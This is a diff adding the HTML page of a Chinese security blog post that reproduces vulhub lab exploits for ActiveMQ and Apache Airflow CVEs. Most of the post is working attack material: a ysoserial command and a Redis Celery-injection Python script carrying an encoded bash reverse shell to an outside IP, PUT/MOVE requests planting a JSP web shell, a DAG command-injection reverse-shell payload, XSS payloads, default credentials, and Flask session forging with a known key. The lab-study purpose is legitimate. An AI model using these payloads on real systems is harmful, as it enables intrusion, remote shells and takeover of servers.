@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free@6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"gudiffany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="vulhub复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulhub复现">
+<meta property="og:url" content="https://gudiffany.github.io/2023/08/15/22-30-45/index.html">
+<meta property="og:site_name" content="diffany">
+<meta property="og:description" content="vulhub复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230726140237544.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230726140226424.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230726145900450.png">
+<meta property="article:published_time" content="2023-08-15T14:30:45.000Z">
+<meta property="article:modified_time" content="2023-08-15T14:55:21.878Z">
+<meta property="article:author" content="diffany">
+<meta property="article:tag" content="CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gudiffany.github.io/img/image-20230726140237544.png">
+
+
+<link rel="canonical" href="https://gudiffany.github.io/2023/08/15/22-30-45/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://gudiffany.github.io/2023/08/15/22-30-45/","path":"2023/08/15/22-30-45/","title":"vulhub复现"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulhub复现 | diffany</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">diffany</p>
+      <i class="logo-line"></i>
+    </a>
+      <img class="custom-logo-image" src="/uploads/custom-logo.png" alt="diffany">
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-友情链接"><a href="/friend/" rel="section"><i class="fa fa-sitemap fa-fw"></i>友情链接</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">vulhub复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">A</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#activemq"><span class="nav-number">2.1.</span> <span class="nav-text">activemq</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ActiveMQ-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89"><span class="nav-number">2.1.1.</span> <span class="nav-text">ActiveMQ 反序列化漏洞（CVE-2015-5254）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89ActiveMQ-5-0-0-5-13-2"><span class="nav-number">2.1.2.</span> <span class="nav-text">ActiveMQ任意文件写入漏洞（CVE-2016-3088）ActiveMQ 5.0.0 - 5.13.2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ActiveMQ%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.3.</span> <span class="nav-text">ActiveMQ其他漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%B1%E5%AF%86%E7%A0%81"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">弱密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.3.2.</span> <span class="nav-text">未授权漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">2.1.3.3.</span> <span class="nav-text">信息泄露</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.3.4.</span> <span class="nav-text">XSS漏洞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#airflow"><span class="nav-number">2.2.</span> <span class="nav-text">airflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-Airflow-%E7%A4%BA%E4%BE%8Bdag%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-11978%EF%BC%89"><span class="nav-number">2.2.1.</span> <span class="nav-text">Apache Airflow 示例dag中的命令注入（CVE-2020-11978）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-Airflow-Celery-%E6%B6%88%E6%81%AF%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2020-11981%EF%BC%89"><span class="nav-number">2.2.2.</span> <span class="nav-text">Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-Airflow-%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%EF%BC%88CVE-2020-17526%EF%BC%89"><span class="nav-number">2.2.3.</span> <span class="nav-text">Apache Airflow 默认密钥导致的权限绕过（CVE-2020-17526）</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">diffany</p>
+  <div class="site-description" itemprop="description">一个努力学习的菜鸟</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://unpkg.com/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+        <div class="pjax">
+        </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://gudiffany.github.io/2023/08/15/22-30-45/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="diffany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diffany">
+      <meta itemprop="description" content="一个努力学习的菜鸟">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulhub复现 | diffany">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulhub复现<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/_posts/vulhub%E5%A4%8D%E7%8E%B0.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pen-nib"></i></a>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-08-15 22:30:45 / 修改时间：22:55:21" itemprop="dateCreated datePublished" datetime="2023-08-15T22:30:45+08:00">2023-08-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2023/08/15/22-30-45/" class="post-meta-item leancloud_visitors" data-flag-title="vulhub复现" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1>vulhub复现</h1>
+<span id="more"></span>
+<h1>A</h1>
+<h2 id="activemq">activemq</h2>
+<h3 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）">ActiveMQ 反序列化漏洞（CVE-2015-5254）</h3>
+<p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
+<p><code>通过web管理页面访问消息并触发漏洞这个过程需要管理员权限</code></p>
+<p>通过jmet-0.1.0-all.jar中的ysoserial生成Payload进行getshell（需要进行编码）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTU0LjIxOS8xMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 43.139.154.219 61616</span><br></pre></td></tr></table></figure>
+<h3 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）ActiveMQ-5-0-0-5-13-2">ActiveMQ任意文件写入漏洞（CVE-2016-3088）ActiveMQ 5.0.0 - 5.13.2</h3>
+<p>ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/1.txt HTTP/1.1</span><br><span class="line">Host: 43.139.154.219:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 327</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> out.print(&quot;Hello&lt;/br&gt;&quot;);</span><br><span class="line"> String strcmd=request.getParameter(&quot;cmd&quot;);</span><br><span class="line"> String line=null;</span><br><span class="line"> Process p=Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"> while((line=br.readLine())!=null)&#123;</span><br><span class="line"> out.print(line+&quot;&lt;/br&gt;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/1.txt HTTP/1.1</span><br><span class="line">Destination:file:///opt/activemq/webapps/api/5.jsp</span><br><span class="line">Host: 43.139.154.219:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+<h3 id="ActiveMQ其他漏洞">ActiveMQ其他漏洞</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/justbaibai/Armory/tree/main/a/ActiveMQ">https://github.com/justbaibai/Armory/tree/main/a/ActiveMQ</a></p>
+<h4 id="弱密码">弱密码</h4>
+<p>admin/admin</p>
+<h4 id="未授权漏洞">未授权漏洞</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/admin/connections.jsp</span><br><span class="line">/api</span><br></pre></td></tr></table></figure>
+<h4 id="信息泄露">信息泄露</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com:8161//admin/index.jsp</span><br><span class="line">http://www.example.com:8161//admin/queues.jsp</span><br><span class="line">http://www.example.com:8161//admin/topics.jsp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">会返回应用名称，JVM，操作系统以及内核版本等信息。</span><br><span class="line">telnet ip:61616</span><br><span class="line"></span><br><span class="line">影响版本：</span><br><span class="line">apache-activemq-5.15.0 to apache-activemq-5.15.2</span><br><span class="line">apache-activemq-5.14.0 to apache-activemq-5.14.5</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/a../%08     较低版本有用</span><br></pre></td></tr></table></figure>
+<h4 id="XSS漏洞">XSS漏洞</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/queueBrowse/example.A?view=rss&amp;feedType=&lt;script&gt;alert(&quot;ACTIVEMQ&quot;)&lt;/script&gt; </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/createDestination.action?JMSDestination=[XSS_PAYLOAD]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/queues.jsp?QueueFilter=yu1ey%22%3e%3cscript%3ealert(%22SpiderLabs%22)%3c%2fscript%3eqb68</span><br></pre></td></tr></table></figure>
+<h2 id="airflow">airflow</h2>
+<h3 id="Apache-Airflow-示例dag中的命令注入（CVE-2020-11978）">Apache Airflow 示例dag中的命令注入（CVE-2020-11978）</h3>
+<p>未授权的访问者可以通过这个漏洞在Worker中执行任意命令。</p>
+<p>进入airflow管理端，将<code>example_trigger_target_dag</code>前面的Off改为On：</p>
+<p><img src="/img/image-20230726140237544.png" alt="image-20230726140237544" /></p>
+<p>然后再Trigger DAG: example_trigger_target_dag中执行命令即可</p>
+<p><img src="/img/image-20230726140226424.png" alt="image-20230726140226424" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;\&quot;;bash -i &gt;&amp; /dev/tcp/43.139.154.219/1234 0&gt;&amp;1;#&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>原理，通过example_trigger_target_dagschedule: None直接调用dag_run，然后使用字符串拼接得到</p>
+<p><img src="/img/image-20230726145900450.png" alt="image-20230726145900450" /></p>
+<h3 id="Apache-Airflow-Celery-消息中间件命令执行（CVE-2020-11981）">Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">import redis</span><br><span class="line">import sys</span><br><span class="line">r = redis.Redis(host=sys.argv[1], port=6379, decode_responses=True,db=0) </span><br><span class="line">queue_name = &#x27;default&#x27;</span><br><span class="line">ori_str=&quot;&#123;\&quot;content-encoding\&quot;: \&quot;utf-8\&quot;, \&quot;properties\&quot;: &#123;\&quot;priority\&quot;: 0, \&quot;delivery_tag\&quot;: \&quot;f29d2b4f-b9d6-4b9a-9ec3-029f9b46e066\&quot;, \&quot;delivery_mode\&quot;: 2, \&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;correlation_id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;exchange\&quot;: \&quot;\&quot;&#125;, \&quot;reply_to\&quot;: \&quot;fb996eec-3033-3c10-9ee1-418e1ca06db8\&quot;&#125;, \&quot;content-type\&quot;: \&quot;application/json\&quot;, \&quot;headers\&quot;: &#123;\&quot;retries\&quot;: 0, \&quot;lang\&quot;: \&quot;py\&quot;, \&quot;argsrepr\&quot;: \&quot;(100, 200)\&quot;, \&quot;expires\&quot;: null, \&quot;task\&quot;: \&quot;airflow.executors.celery_executor.execute_command\&quot;, \&quot;kwargsrepr\&quot;: \&quot;&#123;&#125;\&quot;, \&quot;root_id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;parent_id\&quot;: null, \&quot;id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;origin\&quot;: \&quot;gen1@132f65270cde\&quot;, \&quot;eta\&quot;: null, \&quot;group\&quot;: null, \&quot;timelimit\&quot;: [null, null]&#125;, \&quot;body\&quot;: \&quot;W1sxMDAsIDIwMF0sIHt9LCB7ImNoYWluIjogbnVsbCwgImNob3JkIjogbnVsbCwgImVycmJhY2tzIjogbnVsbCwgImNhbGxiYWNrcyI6IG51bGx9XQ==\&quot;&#125;&quot;</span><br><span class="line">task_dict = json.loads(ori_str)</span><br><span class="line">#command = [&#x27;touch&#x27;, &#x27;/tmp/airflow_celery_success&#x27;]</span><br><span class="line">command = [&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTU0LjIxOS8xMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;]</span><br><span class="line">body=[[command], &#123;&#125;, &#123;&quot;chain&quot;: None, &quot;chord&quot;: None, &quot;errbacks&quot;: None, &quot;callbacks&quot;: None&#125;]</span><br><span class="line">print(body)</span><br><span class="line">task_dict[&#x27;body&#x27;]=base64.b64encode(json.dumps(body).encode()).decode()</span><br><span class="line">print(task_dict)</span><br><span class="line">r.lpush(queue_name,json.dumps(task_dict))</span><br></pre></td></tr></table></figure>
+<h3 id="Apache-Airflow-默认密钥导致的权限绕过（CVE-2020-17526）">Apache Airflow 默认密钥导致的权限绕过（CVE-2020-17526）</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install flask-unsign</span><br><span class="line">pip3 install flask-unsign[wordlist]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://localhost:8080/admin/airflow/login</span><br><span class="line">*   Trying 127.0.0.1:8080...</span><br><span class="line">* Connected to localhost (127.0.0.1) port 8080 (#0)</span><br><span class="line">&gt; GET /admin/airflow/login HTTP/1.1</span><br><span class="line">&gt; Host: localhost:8080</span><br><span class="line">&gt; User-Agent: curl/7.88.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Server: gunicorn/19.10.0</span><br><span class="line">&lt; Date: Wed, 26 Jul 2023 07:44:11 GMT</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; Content-Type: text/html; charset=utf-8</span><br><span class="line">&lt; Content-Length: 7750</span><br><span class="line">&lt; Vary: Cookie</span><br><span class="line">&lt; Set-Cookie: session=eyJjc3JmX3Rva2VuIjoiN2QyYmViNjhhMjNkNjk4ZDdlZjJmM2M1M2ZhYThmZjU4MjNjNGM0MSJ9.ZMDOyw.2giwxxnjtgQEvMgUlvvCozp0hsg; HttpOnly; Path=/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -u -c eyJjc3JmX3Rva2VuIjoiN2QyYmViNjhhMjNkNjk4ZDdlZjJmM2M1M2ZhYThmZjU4MjNjNGM0MSJ9.ZMDOyw.2giwxxnjtgQEvMgUlvvCozp0hsg</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -s --secret temporary_key -c &quot;&#123;&#x27;user_id&#x27;: &#x27;1&#x27;, &#x27;_fresh&#x27;: False, &#x27;_permanent&#x27;: True&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>diffany
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://gudiffany.github.io/2023/08/15/22-30-45/" title="vulhub复现">https://gudiffany.github.io/2023/08/15/22-30-45/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/CVE/" rel="tag"><i class="fa fa-tag"></i> CVE</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/08/15/22-27-36/" rel="prev" title="burp-xxe">
+                  <i class="fa fa-chevron-left"></i> burp-xxe
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/08/16/13-36-40/" rel="next" title="2023ImaginaryCTF">
+                  2023ImaginaryCTF <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
